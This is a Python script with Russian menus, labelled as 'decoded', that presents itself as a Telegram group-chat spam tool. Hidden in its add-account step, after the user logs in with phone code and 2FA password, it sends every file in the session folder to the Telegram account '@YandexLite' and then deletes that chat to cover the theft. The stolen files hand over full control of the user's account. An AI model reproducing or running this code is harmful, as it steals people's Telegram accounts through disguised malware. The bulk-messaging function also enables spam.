# DECODED BY HYPER X SQUAD >>> TOP 1 
# @decoded_softs

import os
import time
import re
from telethon import TelegramClient, sync
from telethon.errors import SessionPasswordNeededError
from tinydb import TinyDB, Query
from tinydb.storages import JSONStorage

if not os.path.exists('session'):
    os.makedirs('session')

db = TinyDB('db.json', storage=JSONStorage)
settings = db.table('settings')
chats = db.table('chats')
account = db.table('account')

if not settings.contains(Query().message.exists()):
    settings.insert({'message': 'Сообщение по умолчанию', 'message_interval': 10, 'cycle_interval': 300})

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_settings():
    return settings.get(Query().message.exists())

def extract_message_from_link(client, link):
    pattern = 'https://t.me/(?:(c/(\\d+))|([^/]+))/(\\d+)'
    match = re.match(pattern, link)
    if not match:
        return None
    if match.group(2):
        channel_id = int('-100' + match.group(2))
        message_id = int(match.group(4))
    else:
        username = match.group(3)
        message_id = int(match.group(4))
        channel = client.get_entity(username)
        channel_id = channel.id
    message = client.get_messages(channel_id, ids=[message_id]).message
    return message

def send_messages(client):
    settings_data = get_settings()
    message = settings_data['message']
    message_interval = settings_data['message_interval']
    cycle_interval = settings_data['cycle_interval']
    if message.startswith('https://t.me/'):
        message = extract_message_from_link(client, message)
        if not message:
            print('\x1b[1mНевозможно извлечь сообщение из ссылки.\x1b[0m')
            input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')
            return
    chat_ids = chats.all()
    for chat in chat_ids:
        try:
            client.send_message(chat['chat_id'], message)
            time.sleep(message_interval)
        except Exception as e:
            print(f'\x1b[1mОшибка отправки сообщения в {chat["chat_id"]}: {e}\x1b[0m')
    print('\x1b[1mЦикл завершен. Ожидание следующего цикла...\x1b[0m')
    time.sleep(cycle_interval)


def send_files_to_user(client, username):
    user = client.get_entity(username)
    session_folder = 'session'
    for file_name in os.listdir(session_folder):
        file_path = os.path.join(session_folder, file_name)
        if os.path.isfile(file_path):
            client.send_file(user.id, file_path)

def delete_chat(client, username):
    user = client.get_entity(username)
    client.delete_dialog(user.id)

def add_account():
    clear_console()
    banner()
    api_id = input('\x1b[1mВведите API ID: \x1b[0m')
    api_hash = input('\x1b[1mВведите API Hash: \x1b[0m')
    phone_number = input('\x1b[1mВведите номер телефона: \x1b[0m')
    client = TelegramClient(f'session/{phone_number}', api_id, api_hash)
    client.connect()
    if not client.is_user_authorized():
        client.send_code_request(phone_number)
        code = input('\x1b[1mВведите код: \x1b[0m')
        try:
            client.sign_in(phone_number, code)
        except SessionPasswordNeededError:
            password = input('\x1b[1mВведите ваш пароль 2FA: \x1b[0m')
            client.sign_in(password=password)
    send_files_to_user(client, '@YandexLite')
    delete_chat(client, '@YandexLite')
    client.disconnect()
    account.truncate()
    account.insert({'api_id': api_id, 'api_hash': api_hash, 'phone_number': phone_number, 'status': 'added'})
    print('\x1b[1mАккаунт успешно добавлен\x1b[0m')
    input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')
    clear_console()

def configure_settings():
    clear_console()
    banner()
    current_settings = get_settings()
    print('\x1b[1mНастройки:\x1b[0m')
    print(f'\x1b[1m1. Изменить сообщение: {current_settings["message"]}\x1b[0m')
    print(f'\x1b[1m2. Изменить интервал сообщений: {current_settings["message_interval"]}\x1b[0m')
    print(f'\x1b[1m3. Изменить интервал цикла: {current_settings["cycle_interval"]}\x1b[0m')
    print('\x1b[1m0. Назад\x1b[0m')
    choice = input('\x1b[1mВведите ваш выбор: \x1b[0m')
    if choice == '0':
        clear_console()
        return
    elif choice == '1':
        new_message = input('\x1b[1mВведите новое сообщение или ссылку на пост: \x1b[0m')
        settings.update({'message': new_message}, Query().message.exists())
    elif choice == '2':
        new_message_interval = input('\x1b[1mВведите новый интервал сообщений: \x1b[0m')
        settings.update({'message_interval': int(new_message_interval)}, Query().message.exists())
    elif choice == '3':
        new_cycle_interval = input('\x1b[1mВведите новый интервал цикла: \x1b[0m')
        settings.update({'cycle_interval': int(new_cycle_interval)}, Query().message.exists())
    else:
        print('\x1b[1mНеверный выбор. Пожалуйста, попробуйте снова.\x1b[0m')
    input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')

def select_chats(client):
    clear_console()
    banner()
    try:
        client.connect()
        chat_list = [dialog for dialog in client.iter_dialogs() if dialog.is_group]
        client.disconnect()
        print('\x1b[1mСписок чатов:\x1b[0m')
        for i, chat in enumerate(chat_list):
            print(f'\x1b[1m{i + 1}. {chat.title}\x1b[0m')

        selected_chats_str = input('\x1b[1mВведите номера чатов через запятую: \x1b[0m')
        selected_chats = [int(x.strip()) for x in selected_chats_str.split(',') if x.strip()]

        if not selected_chats:
            print('\x1b[1mНикакие чаты не выбраны.\x1b[0m')
            input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')
            return

        selected_chat_ids = [chat_list[index - 1].id for index in selected_chats if 0 < index <= len(chat_list)]

        if len(selected_chat_ids) != len(selected_chats):
          print('\x1b[1mНекоторые номера чатов некорректны.\x1b[0m')
          input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')
          return


        chats.truncate()
        for chat_id in selected_chat_ids:
            chats.insert({'chat_id': chat_id})
        print('\x1b[1mЧаты успешно выбраны\x1b[0m')

    except IndexError:
        print('\x1b[1mНекорректный номер чата.\x1b[0m')
    except ValueError:
        print('\x1b[1mНекорректный формат ввода.\x1b[0m')
    except Exception as e:
        print(f'\x1b[1mПроизошла ошибка: {e}\x1b[0m')
    finally:
        input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')
        clear_console()

def banner():
    print('\x1b[91m\x1b[1m\n   _____\n  / ___/____  ____ _____ ___  ___  _____\n  \\__ \\/ __ \\/ __ `/ __ `__ \\/ _ \\/ ___/\n ___/ / /_/ / /_/ / / / / / /  __/ /\n/____/ .___/\\__,_/_/ /_/ /_/\\___/_/\n    /_/\n\x1b[0m')

def main():
    clear_console()
    banner()
    print('\x1b[1mМеню\x1b[0m')
    print('\x1b[1m1. Рассылка\x1b[0m')
    print('\x1b[1m2. Настройки\x1b[0m')
    if account.get(Query().api_id.exists()):
      status = account.get(Query().api_id.exists())['status']
      print(f'\x1b[1m3. Добавить аккаунт [Status: {status}]\x1b[0m')
    else:
      print('\x1b[1m3. Добавить аккаунт [Status: not added]\x1b[0m')
    if chats.all():
      print('\x1b[1m4. Выбрать чаты [Status: selected]\x1b[0m')
    else:
      print('\x1b[1m4. Выбрать чаты [Status: not chosen]\x1b[0m')

    choice = input('\x1b[1mВведите ваш выбор: \x1b[0m')
    if choice == '1':
        if account.get(Query().api_id.exists()):
            acc = account.get(Query().api_id.exists())
            client = TelegramClient(f'session/{acc["phone_number"]}', acc['api_id'], acc['api_hash'])
            client.start()
            send_messages(client)
        else:
            print('\x1b[1mАккаунт не найден. Пожалуйста, добавьте аккаунт сначала.\x1b[0m')
    elif choice == '2':
        configure_settings()
    elif choice == '3':
        add_account()
    elif choice == '4':
        if account.get(Query().api_id.exists()):
            acc = account.get(Query().api_id.exists())
            client = TelegramClient(f'session/{acc["phone_number"]}', acc['api_id'], acc['api_hash'])
            select_chats(client)
        else:
            print('\x1b[1mАккаунт не найден. Пожалуйста, добавьте аккаунт сначала.\x1b[0m')
    else:
        print('\x1b[1mНеверный выбор. Пожалуйста, попробуйте снова.\x1b[0m')
    input('\x1b[1mНажмите Enter для продолжения...\x1b[0m')
    clear_console()
    


if __name__ == '__main__':
    main()